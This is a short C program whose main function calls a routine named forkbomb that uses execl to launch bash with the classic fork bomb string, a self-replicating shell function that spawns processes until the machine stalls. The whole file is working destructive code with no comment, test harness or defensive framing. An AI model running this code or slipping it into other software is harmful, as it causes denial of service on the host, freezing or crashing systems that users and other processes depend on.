#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void forkbomb()
{
    execl("/bin/bash","bomb","-c",":(){ :|:& };:",(char*)0);
}

int main()
{
    forkbomb();
    return 8888;
}
